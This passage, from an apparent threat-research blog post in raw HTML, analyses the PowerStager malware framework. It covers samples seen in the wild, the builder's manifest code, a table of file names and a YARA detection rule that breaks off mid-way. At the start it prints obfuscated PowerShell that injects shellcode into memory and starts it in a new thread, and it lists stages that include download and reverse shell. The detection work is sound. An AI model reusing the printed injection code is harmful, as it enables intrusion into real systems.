class="crayon-sy">[</span><span class="crayon-t">VoID</span><span class="crayon-sy">]</span><span class="crayon-sy">$</span><span class="crayon-v">piPtZNxr1f5K</span><span class="crayon-o">::</span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-s">'0 3 0 2 3 1'</span><span class="crayon-o">-</span><span class="crayon-i">RepLAce</span><span class="crayon-s">'\w+'</span><span class="crayon-sy">,</span><span class="crayon-s">'{${0}}'</span><span class="crayon-o">-</span><span class="crayon-i">rEplacE</span><span class="crayon-s">' '</span><span class="crayon-sy">,</span><span class="crayon-s">''</span><span class="crayon-sy">)</span><span class="crayon-o">-</span><span class="crayon-i">f</span><span class="crayon-s">'m'</span><span class="crayon-sy">,</span><span class="crayon-s">'t'</span><span class="crayon-sy">,</span><span class="crayon-s">'s'</span><span class="crayon-sy">,</span><span class="crayon-s">'e'</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">INVOKe</span><span class="crayon-sy">(</span><span class="crayon-sy">[</span><span class="crayon-v">InTptr</span><span class="crayon-sy">]</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">lXw9sqCMdGHQ</span><span class="crayon-sy">.</span><span class="crayon-e">ToInt32</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-o">+</span><span class="crayon-sy">$</span><span class="crayon-v">Zxv0oxgiqKpR</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span><span class="crayon-sy">$</span><span class="crayon-v">RDm7s2YDUaBL</span><span class="crayon-sy">[</span><span class="crayon-sy">$</span><span class="crayon-v">Zxv0oxgiqKpR</span><span class="crayon-sy">]</span><span class="crayon-sy">,</span><span class="crayon-cn">1</span><span class="crayon-sy">)</span><span class="crayon-sy">}</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">piPtZNxr1f5K</span><span class="crayon-o">::</span><span class="crayon-sy">(</span><span class="crayon-s">'CrEatETHrE'</span><span class="crayon-o">+</span><span class="crayon-s">'A'</span><span class="crayon-o">+</span><span class="crayon-s">'d'</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">InvoKE</span><span class="crayon-sy">(</span><span class="crayon-cn">0</span><span class="crayon-sy">,</span><span class="crayon-cn">0</span><span class="crayon-sy">,</span><span class="crayon-sy">$</span><span class="crayon-v">lXw9sqCMdGHQ</span><span class="crayon-sy">,</span><span class="crayon-cn">0</span><span class="crayon-sy">,</span><span class="crayon-cn">0</span><span class="crayon-sy">,</span><span class="crayon-cn">0</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-sy">.</span><span class="crayon-sy">(</span><span class="crayon-s">'{0}'</span><span class="crayon-o">-</span><span class="crayon-i">f</span><span class="crayon-s">'STarT-slEep'</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-cn">100000</span></div></div></td>
+					</tr>
+				</table>
+			</div>
+		</div>
+<!-- [Format Time: 0.0019 seconds] -->
+<p>The shellcode is fairly standard and won’t be looked at here; however, there are multiple static shellcode blobs within the source code and then the option to embed a Meterpreter reverse_tcp shellcode. For the handful of ones I manually looked at, every single instance was the embedded “reverse_tcp stager” found in the source code.<br />
+In total, there are 7 total PowerShell scripts that can be generated from the script and the commented names are listed below and show the general process of execution that I tried to illustrate at the beginning.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->
+
+		<div id="crayon-5f694cd07d7ef291358117" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-always wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
+		
+			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
+			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
+			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
+			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
+Main
+Base64 decoder
+XOR decryptor
+System.Net.WebClient
+Encoded command
+Memory injection
+Reverse powershell</textarea></div>
+			<div class="crayon-main" style="">
+				<table class="crayon-table">
+					<tr class="crayon-row">
+				<td class="crayon-nums " data-settings="show">
+					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f694cd07d7ef291358117-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694cd07d7ef291358117-2">2</div><div class="crayon-num" data-line="crayon-5f694cd07d7ef291358117-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694cd07d7ef291358117-4">4</div><div class="crayon-num" data-line="crayon-5f694cd07d7ef291358117-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694cd07d7ef291358117-6">6</div><div class="crayon-num" data-line="crayon-5f694cd07d7ef291358117-7">7</div></div>
+				</td>
+						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f694cd07d7ef291358117-1"><span class="crayon-e">Main</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694cd07d7ef291358117-2"><span class="crayon-e">Base64 </span><span class="crayon-e">decoder</span></div><div class="crayon-line" id="crayon-5f694cd07d7ef291358117-3"><span class="crayon-st">XOR</span><span class="crayon-h"> </span><span class="crayon-e">decryptor</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694cd07d7ef291358117-4"><span class="crayon-v">System</span><span class="crayon-sy">.</span><span class="crayon-v">Net</span><span class="crayon-sy">.</span><span class="crayon-e">WebClient</span></div><div class="crayon-line" id="crayon-5f694cd07d7ef291358117-5"><span class="crayon-e">Encoded </span><span class="crayon-e">command</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694cd07d7ef291358117-6"><span class="crayon-e">Memory </span><span class="crayon-e">injection</span></div><div class="crayon-line" id="crayon-5f694cd07d7ef291358117-7"><span class="crayon-e">Reverse </span><span class="crayon-v">powershell</span></div></div></td>
+					</tr>
+				</table>
+			</div>
+		</div>
+<!-- [Format Time: 0.0002 seconds] -->
+<p>All in all, I feel it’s a well put together framework that offers good obfuscation and flexibility in avoiding detection.<br />
+&nbsp;<br />
+<span style="font-size: 18pt;">Detection in the Wild</span><br />
+Now that I’ve analyzed the samples and found the source code, which confirms a lot of the above analysis efforts, I’ll talk briefly about attacks seen in the wild.<br />
+As of December 29<sup>th</sup> 2017, Palo Alto Networks has observed 502 unique samples of PowerStager in the wild. In instances where I was able to identify a target, they all belonged to Western European Media and Wholesale organizations; however, there were also many samples that were identified as being used for testing and sales proof-of-concepts demonstrations. I don’t find this surprising as blue teams, red teams, and security companies frequently test out new tools to continue innovating.<br />
+Looking at the statically configured file name across the samples, only 7 file names were used more than once with one file name found across 9 samples. All of the duplicate file names were related to testing – eg. scan a file, add a byte, scan the file again, slightly modify the file in some other way, scan again, so on and so forth.<br />
+When building the samples, PowerStager includes a Manifest in the C source code that defines certain attributes of the executables. This provides a decent mechanism to track the samples, although it is trivial to change. Specifically, the “Description” field is static and the “Company Name” always ends with “ INC.”.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->
+
+		<div id="crayon-5f694cd07d7f1316284773" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-always wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
+		
+			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
+			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
+			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
+			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
+rc_company_name			= names.get_last_name() + " INC."
+rc_description			= "Lorem ipsum dolor sit amet, consecteteur adipiscing elit."
+rc_internal_name		= "".join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(10))
+rc_legal_name			= names.get_full_name()
+rc_original_filename	= output.split("/")[-1:][0]
+rc_product_name			= rc_internal_name</textarea></div>
+			<div class="crayon-main" style="">
+				<table class="crayon-table">
+					<tr class="crayon-row">
+				<td class="crayon-nums " data-settings="show">
+					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f694cd07d7f1316284773-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694cd07d7f1316284773-2">2</div><div class="crayon-num" data-line="crayon-5f694cd07d7f1316284773-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694cd07d7f1316284773-4">4</div><div class="crayon-num" data-line="crayon-5f694cd07d7f1316284773-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694cd07d7f1316284773-6">6</div></div>
+				</td>
+						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f694cd07d7f1316284773-1"><span class="crayon-v">rc_company_name</span><span class="crayon-h">			</span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">names</span><span class="crayon-sy">.</span><span class="crayon-e">get_last_name</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-s">" INC."</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694cd07d7f1316284773-2"><span class="crayon-v">rc_description</span><span class="crayon-h">			</span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"Lorem ipsum dolor sit amet, consecteteur adipiscing elit."</span></div><div class="crayon-line" id="crayon-5f694cd07d7f1316284773-3"><span class="crayon-v">rc_internal_name</span><span class="crayon-h">		</span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">""</span><span class="crayon-sy">.</span><span class="crayon-e">join</span><span class="crayon-sy">(</span><span class="crayon-v">random</span><span class="crayon-sy">.</span><span class="crayon-e">SystemRandom</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">choice</span><span class="crayon-sy">(</span><span class="crayon-t">string</span><span class="crayon-sy">.</span><span class="crayon-v">ascii_uppercase</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-t">string</span><span class="crayon-sy">.</span><span class="crayon-v">digits</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-st">for</span><span class="crayon-h"> </span><span class="crayon-i">_</span><span class="crayon-h"> </span><span class="crayon-st">in</span><span class="crayon-h"> </span><span class="crayon-e">range</span><span class="crayon-sy">(</span><span class="crayon-cn">10</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694cd07d7f1316284773-4"><span class="crayon-v">rc_legal_name</span><span class="crayon-h">			</span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">names</span><span class="crayon-sy">.</span><span class="crayon-e">get_full_name</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-5f694cd07d7f1316284773-5"><span class="crayon-v">rc_original_filename</span><span class="crayon-h">	</span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">output</span><span class="crayon-sy">.</span><span class="crayon-e">split</span><span class="crayon-sy">(</span><span class="crayon-s">"/"</span><span class="crayon-sy">)</span><span class="crayon-sy">[</span><span class="crayon-o">-</span><span class="crayon-cn">1</span><span class="crayon-o">:</span><span class="crayon-sy">]</span><span class="crayon-sy">[</span><span class="crayon-cn">0</span><span class="crayon-sy">]</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694cd07d7f1316284773-6"><span class="crayon-v">rc_product_name</span><span class="crayon-h">			</span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">rc_internal_name</span></div></div></td>
+					</tr>
+				</table>
+			</div>
+		</div>
+<!-- [Format Time: 0.0006 seconds] -->
+<p>You’ll note that the “Original Filename” field is set to part of the “output” variable. This is a mandatory field specified at compile time and provides a tiny glimpse into the person behind the sample. While there were over 427 unique values in this field, the below table shows the names for files tied to more than one sample.</p>
+<table>
+<tbody>
+<tr>
+<td width="94">Sample Count</td>
+<td width="104">Original Filename</td>
+</tr>
+<tr>
+<td width="94">12</td>
+<td width="104">test</td>
+</tr>
+<tr>
+<td width="94">9</td>
+<td width="104">love</td>
+</tr>
+<tr>
+<td width="94">8</td>
+<td width="104">youtube</td>
+</tr>
+<tr>
+<td width="94">5</td>
+<td width="104">123</td>
+</tr>
+<tr>
+<td width="94">4</td>
+<td width="104">payload</td>
+</tr>
+<tr>
+<td width="94">3</td>
+<td width="104">virus</td>
+</tr>
+<tr>
+<td width="94">3</td>
+<td width="104">test32</td>
+</tr>
+<tr>
+<td width="94">3</td>
+<td width="104">powerstager</td>
+</tr>
+<tr>
+<td width="94">3</td>
+<td width="104">powershell</td>
+</tr>
+<tr>
+<td width="94">3</td>
+<td width="104">hack</td>
+</tr>
+<tr>
+<td width="94">2</td>
+<td width="104">yit</td>
+</tr>
+<tr>
+<td width="94">2</td>
+<td width="104">windows</td>
+</tr>
+<tr>
+<td width="94">2</td>
+<td width="104">win7</td>
+</tr>
+<tr>
+<td width="94">2</td>
+<td width="104">try4</td>
+</tr>
+<tr>
+<td width="94">2</td>
+<td width="104">transaction</td>
+</tr>
+<tr>
+<td width="94">2</td>
+<td width="104">test1</td>
+</tr>
+<tr>
+<td width="94">2</td>
+<td width="104">server</td>
+</tr>
+<tr>
+<td width="94">2</td>
+<td width="104">rat</td>
+</tr>
+<tr>
+<td width="94">2</td>
+<td width="104">oneshot.exe</td>
+</tr>
+<tr>
+<td width="94">2</td>
+<td width="104">nudes.exe</td>
+</tr>
+<tr>
+<td width="94">2</td>
+<td width="104">install</td>
+</tr>
+<tr>
+<td width="94">2</td>
+<td width="104">fist1</td>
+</tr>
+<tr>
+<td width="94">2</td>
+<td width="104">demon.exe</td>
+</tr>
+<tr>
+<td width="94">2</td>
+<td width="104">carlos</td>
+</tr>
+<tr>
+<td width="94">2</td>
+<td width="104">backdoor</td>
+</tr>
+<tr>
+<td width="94">2</td>
+<td width="104">abc</td>
+</tr>
+<tr>
+<td width="94">2</td>
+<td width="104">Test</td>
+</tr>
+<tr>
+<td width="94">2</td>
+<td width="104">Okari</td>
+</tr>
+<tr>
+<td width="94">2</td>
+<td width="104">555</td>
+</tr>
+<tr>
+<td width="94">2</td>
+<td width="104">1</td>
+</tr>
+</tbody>
+</table>
+<p><em>Table 1 Repeated filenames across samples</em><br />
+Other notable names include the usual targets for executable masquerading: vnc, vlc, Skype, Notepad, and Minecraft.<br />
+Additionally, the “ProductName” field will always be a 10-character string with mixed upper-case letters and digits.<br />
+These all provide useful methods to statically characterize these files and, coupled with unique obfuscation and PowerShell methods during dynamic analysis, a solid way to identify them.<br />
+For error messages, all but 30 samples included the default error message. The ones that did not simply contained no error message.<br />
+The following YARA rule will provide additional coverage for the x86 and x64 variants of the generated Windows executable.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->
+
+		<div id="crayon-5f694cd07d7f3546825598" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-always wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
+		
+			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
+			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
+			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
+			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
+rule powerstager
+{
+    meta:
+	author = "Jeff White - jwhite@paloaltonetworks.com @noottrak"
+	date = "02JAN2018"
+	hash1 = "758097319d61e2744fb6b297f0bff957c6aab299278c1f56a90fba197795a0fa" //x86
+	hash2 = "83e714e72d9f3c500cad610c4772eae6152a232965191f0125c1c6f97004b7b5" //x64
+	description = "Detects PowerStager Windows executable, both x86 and x64"
+    strings:
+	$filename = /%s\\[a-zA-Z0-9]{12}/
+	$pathname = "TEMP" wide ascii
+//	$errormsg = "The version of this file is not compatible with the version of Windows you're running." wide ascii
+	$filedesc = "Lorem ipsum dolor sit amet, consecteteur adipiscing elit" wide ascii
+        $apicall_01 = "memset"
+	$apicall_02 = "getenv"
+	$apicall_03 = "fopen"
+	$apicall_04 = "memcpy"
+	$apicall_05 = "fwrite"
+	$apicall_06 = "fclose"
+	$apicall_07 = "CreateProcessA"
+	$decoder_x86_01 = { 8D 95 [4] 8B 45 ?? 01 D0 0F B6 18 8B 4D ?? }
+	$decoder_x86_02 = { 89 C8 0F B6 84 05 [4] 31 C3 89 D9 8D 95 [4] 8B 45 ?? 01 D0 88 08 83 45 [2] 8B 45 ?? 3D }
+	$decoder_x64_01 = { 8B 85 [4] 48 98 44 0F [7] 8B 85 [4] 48 63 C8 48 }
+	$decoder_x64_02 = { 48 89 ?? 0F B6 [3-6] 44 89 C2 31 C2 8B 85 [4] 48 98 }
+    condition:
+	uint16be(0) == 0x4D5A
+	  and
+	all of ($apicall_*)
+	  and
+	$filename
+	  and
+	$pathname
+	  and
+	$filedesc
+	  and
+	(2 of ($decoder_x86*) or 2 of ($decoder_x64*))
+}</textarea></div>
+			<div class="crayon-main" style="">
+				<table class="crayon-table">
+					<tr class="crayon-row">
+				<td class="crayon-nums " data-settings="show">
+					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f694cd07d7f3546825598-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694cd07d7f3546825598-2">2</div><div class="crayon-num" data-line="crayon-5f694cd07d7f3546825598-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694cd07d7f3546825598-4">4</div><div class="crayon-num" data-line="crayon-5f694cd07d7f3546825598-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694cd07d7f3546825598-6">6</div><div class="crayon-num" data-line="crayon-5f694cd07d7f3546825598-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694cd07d7f3546825598-8">8</div><div class="crayon-num" data-line="crayon-5f694cd07d7f3546825598-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694cd07d7f3546825598-10">10</div><div class="crayon-num" data-line="crayon-5f694cd07d7f3546825598-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694cd07d7f3546825598-12">12</div><div class="crayon-num" data-line="crayon-5f694cd07d7f3546825598-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694cd07d7f3546825598-14">14</div><div class="crayon-num" data-line="crayon-5f694cd07d7f3546825598-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694cd07d7f3546825598-16">16</div><div class="crayon-num" data-line="crayon-5f694cd07d7f3546825598-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694cd07d7f3546825598-18">18</div><div class="crayon-num" data-line="crayon-5f694cd07d7f3546825598-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694cd07d7f3546825598-20">20</div><div class="crayon-num" data-line="crayon-5f694cd07d7f3546825598-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694cd07d7f3546825598-22">22</div><div class="crayon-num" data-line="crayon-5f694cd07d7f3546825598-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694cd07d7f3546825598-24">24</div><div class="crayon-num" data-line="crayon-5f694cd07d7f3546825598-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694cd07d7f3546825598-26">26</div><div class="crayon-num" data-line="crayon-5f694cd07d7f3546825598-27">27</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694cd07d7f3546825598-28">28</div><div class="crayon-num" data-line="crayon-5f694cd07d7f3546825598-29">29</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694cd07d7f3546825598-30">30</div><div class="crayon-num" data-line="crayon-5f694cd07d7f3546825598-31">31</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694cd07d7f3546825598-32">32</div><div class="crayon-num" data-line="crayon-5f694cd07d7f3546825598-33">33</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694cd07d7f3546825598-34">34</div><div class="crayon-num" data-line="crayon-5f694cd07d7f3546825598-35">35</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694cd07d7f3546825598-36">36</div><div class="crayon-num" data-line="crayon-5f694cd07d7f3546825598-37">37</div></div>
+				</td>
+						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f694cd07d7f3546825598-1"><span class="crayon-e">rule</span><span class="crayon-h"> </span><span class="crayon-e">powerstager</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694cd07d7f3546825598-2"><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-5f694cd07d7f3546825598-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">meta</span><span class="crayon-o">:</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694cd07d7f3546825598-4"><span class="crayon-h">	</span><span class="crayon-v">author</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"Jeff White - jwhite@paloaltonetworks.com @noottrak"</span></div><div class="crayon-line" id="crayon-5f694cd07d7f3546825598-5"><span class="crayon-h">	</span><span class="crayon-v">date</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"02JAN2018"</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694cd07d7f3546825598-6"><span class="crayon-h">	</span><span class="crayon-v">hash1</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"758097319d61e2744fb6b297f0bff957c6aab299278c1f56a90fba197795a0fa"</span><span class="crayon-h"> </span><span class="crayon-c">//x86</span></div><div class="crayon-line" id="crayon-5f694cd07d7f3546825598-7"><span class="crayon-h">	</span><span class="crayon-v">hash2</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"83e714e72d9f3c500cad610c4772eae6152a232965191f0125c1c6f97004b7b5"</span><span class="crayon-h"> </span><span class="crayon-c">//x64</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694cd07d7f3546825598-8"><span class="crayon-h">	</span><span class="crayon-v">description</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"Detects PowerStager Windows executable, both x86 and x64"</span></div><div class="crayon-line" id="crayon-5f694cd07d7f3546825598-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">strings</span><span class="crayon-o">:</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694cd07d7f3546825598-10"><span class="crayon-h">	</span><span class="crayon-sy">$</span><span class="crayon-v">filename</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">%</span><span class="crayon-e">s</span><span class="crayon-sy">\</span><span class="crayon-sy">\</span><span class="crayon-sy">[</span><span class="crayon-e">a</span><span class="crayon-o">-</span><span class="crayon-e">zA</span><span class="crayon-o">-</span><span class="crayon-e">Z0</span><span class="crayon-o">-</span><span class="crayon-cn">9</span><span class="crayon-sy">]</span><span class="crayon-sy">{</span><span class="crayon-cn">12</span><span class="crayon-sy">}</span><span class="crayon-o">/</span></div><div class="crayon-line" id="crayon-5f694cd07d7f3546825598-11"><span class="crayon-h">	</span><span class="crayon-sy">$</span><span class="crayon-v">pathname</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"TEMP"</span><span class="crayon-h"> </span><span class="crayon-e">wide </span><span class="crayon-v">ascii</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694cd07d7f3546825598-12"><span class="crayon-c">//	$errormsg = "The version of this file is not compatible with the version of Windows you're running." wide ascii</span></div><div class="crayon-line" id="crayon-5f694cd07d7f3546825598-13"><span class="crayon-h">	</span><span class="crayon-sy">$</span><span class="crayon-v">filedesc</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"Lorem ipsum dolor sit amet, consecteteur adipiscing elit"</span><span class="crayon-h"> </span><span class="crayon-e">wide </span><span class="crayon-i">ascii</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694cd07d7f3546825598-14"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">apicall_01</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"memset"</span></div><div class="crayon-line" id="crayon-5f694cd07d7f3546825598-15"><span class="crayon-h">	</span><span class="crayon-sy">$</span><span class="crayon-v">apicall_02</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"getenv"</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694cd07d7f3546825598-16"><span class="crayon-h">	</span><span class="crayon-sy">$</span><span class="crayon-v">apicall_03</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"fopen"</span></div><div class="crayon-line" id="crayon-5f694cd07d7f3546825598-17"><span class="crayon-h">	</span><span class="crayon-sy">$</span><span class="crayon-v">apicall_04</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"memcpy"</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694cd07d7f3546825598-18"><span class="crayon-h">	</span><span class="crayon-sy">$</span><span class="crayon-v">apicall_05</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"fwrite"</span></div><div class="crayon-line" id="crayon-5f694cd07d7f3546825598-19"><span class="crayon-h">	</span><span class="crayon-sy">$</span><span class="crayon-v">apicall_06</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"fclose"</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694cd07d7f3546825598-20"><span class="crayon-h">	</span><span class="crayon-sy">$</span><span class="crayon-v">apicall_07</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"CreateProcessA"</span></div><div class="crayon-line" id="crayon-5f694cd07d7f3546825598-21"><span class="crayon-h">	</span><span class="crayon-sy">$</span><span class="crayon-v">decoder_x86_01</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">{</span><span class="crayon-h"> </span><span class="crayon-cn">8D</span><span class="crayon-h"> </span><span class="crayon-cn">95</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-cn">4</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-cn">8B</span><span class="crayon-h"> </span><span class="crayon-cn">45</span><span class="crayon-h"> </span><span 